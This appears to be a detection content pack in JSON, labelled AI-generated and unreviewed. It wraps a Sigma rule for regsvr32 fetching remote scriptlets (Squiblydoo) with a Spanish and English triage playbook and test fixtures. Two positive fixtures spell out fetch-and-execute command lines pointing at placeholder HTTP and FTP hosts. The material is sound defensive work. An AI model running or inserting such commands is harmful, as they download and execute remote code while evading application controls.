@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "867356ee-9352-41c9-a8f2-1be690d78216",
+    "title": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.010"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó regsvr32.exe con la opción /i (o -i) y una línea de comandos que contiene «http» o «ftp». Esto suele indicar que se registra o ejecuta un DLL o scriptlet alojado en un servidor remoto.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image termina en \\regsvr32.exe u OriginalFileName es REGSVR32.EXE, y CommandLine contiene ' /i' o ' -i' junto con 'http' o 'ftp'.",
+      "why_it_matters": "Regsvr32 es un binario firmado por Microsoft. Si se le pasa /i con una URL, puede descargar y ejecutar scriptlets COM (.sct) o DLL remotos, una técnica conocida como Squiblydoo. Así se evaden los controles de aplicaciones (ATT&CK T1218.010, ejecución mediante proxy de binarios del sistema).",
+      "triage_steps": [
+        "Revise CommandLine completo: extraiga la URL, el dominio o la IP, el archivo remoto (.sct, .dll) y opciones como /s, /n, /u y scrobj.dll.",
+        "Compare Image con OriginalFileName. Si regsvr32 se ejecutó desde una ruta distinta de System32/SysWOW64 o fue renombrado, aumenta la sospecha.",
+        "Analice ParentImage y la línea de comandos del padre. Office, wscript, mshta, cmd o powershell como padre son indicadores fuertes.",
+        "Verifique la reputación del dominio o la IP y busque conexiones de red de regsvr32 hacia ese destino en el mismo host, en una ventana de +/- 15 minutos.",
+        "Revise los procesos hijos, los archivos creados y los cambios en el registro (claves CLSID, Run) que hizo regsvr32 después de ejecutarse.",
+        "Busque la misma URL o la misma línea de comandos en otros endpoints y revise alertas anteriores del mismo usuario y del mismo host."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos («Unknown»).",
+        "Instaladores o scripts de despliegue antiguos que registran componentes desde un recurso web interno; confírmelo con el equipo de TI.",
+        "Pruebas autorizadas de red team o de validación de controles que usan esta técnica LOLBAS."
+      ],
+      "response_steps": [
+        "Confirme la actividad maliciosa revisando la URL, el contenido descargado y el proceso padre antes de actuar.",
+        "Si se confirma, aísle el endpoint y bloquee el dominio o la IP en el proxy y el firewall.",
+        "Detenga los procesos relacionados, obtenga el hash de los artefactos y elimine la persistencia identificada.",
+        "Restablezca las credenciales del usuario afectado si hubo ejecución de payload y vigile los IOC en todo el entorno.",
+        "Evalúe bloquear las conexiones salientes de regsvr32 mediante reglas de ASR o del firewall."
+      ],
+      "severity_rationale": "El nivel medium es adecuado: el patrón es poco común en uso legítimo y muy asociado a evasión, pero las cadenas 'http' y 'ftp' pueden aparecer en rutas inocuas."
+    },
+    "en": {
+      "summary": "regsvr32.exe ran with the /i (or -i) switch and a command line containing 'http' or 'ftp'. This usually means a remotely hosted DLL or scriptlet is being registered or executed.",
+      "what_it_detects": "Process creation events where Image ends with \\regsvr32.exe or OriginalFileName is REGSVR32.EXE, and CommandLine contains ' /i' or ' -i' plus 'http' or 'ftp'.",
+      "why_it_matters": "Regsvr32 is a Microsoft-signed binary. Given /i and a URL, it can fetch and run remote COM scriptlets (.sct) or DLLs, a technique known as Squiblydoo. This bypasses application controls (ATT&CK T1218.010, Regsvr32 system binary proxy execution).",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, domain or IP, the remote file (.sct, .dll) and switches such as /s, /n, /u and scrobj.dll.",
+        "Compare Image with OriginalFileName. A regsvr32 running outside System32/SysWOW64, or a renamed copy, raises suspicion.",
+        "Check ParentImage and the parent command line. Office apps, wscript, mshta, cmd or powershell as the parent are strong indicators.",
+        "Check the reputation of the domain or IP, and look for regsvr32 network connections to it on the same host within +/- 15 minutes.",
+        "Review the child processes, file writes and registry changes (CLSID, Run keys) that followed the execution.",
+        "Search other endpoints for the same URL or command line, and review earlier alerts for the same user and host."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives ('Unknown').",
+        "Legacy installers or deployment scripts that register components from an internal web share; confirm with IT.",
+        "Authorized red team or control validation tests that use this LOLBAS technique."
+      ],
+      "response_steps": [
+        "Before acting, confirm malicious intent by reviewing the URL, the downloaded content and the parent process.",
+        "If confirmed, isolate the endpoint and block the domain or IP at the proxy and firewall.",
+        "Stop related processes, collect hashes of the artifacts and remove any persistence you find.",
+        "Reset the affected user's credentials if a payload ran, and hunt for the IOCs across the environment.",
+        "Consider blocking outbound connections from regsvr32 with ASR or firewall rules."
+      ],
+      "severity_rationale": "Medium fits because this pattern is rare in legitimate use and closely tied to evasion, but 'http' and 'ftp' can also appear in harmless paths."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Squiblydoo-style regsvr32 fetching a remote scriptlet over HTTP, launched by Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s /n /u /i:http://203.0.113.10/payload.sct scrobj.dll",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n invoice.docm"
+        }
+      },
+      {
+        "description": "Renamed regsvr32 copy (matched via OriginalFileName) using -i with an FTP URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\svc.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "svc.exe -s -i:ftp://files.example.org/pub/comp.sct scrobj.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c svc.exe -s -i:ftp://files.example.org/pub/comp.sct scrobj.dll"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate regsvr32 /i install of a local DLL; no http or ftp in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s /i \"C:\\Program Files\\Contoso\\addin.dll\"",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe"
+        }
+      },
+      {
+        "description": "regsvr32 registering a local IIS module whose path contains 'http' but without the /i switch",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-WEB01.andes.example.com",
+          "User": "ANDES\\adm_iis",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s C:\\inetpub\\httpmodules\\contosomod.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
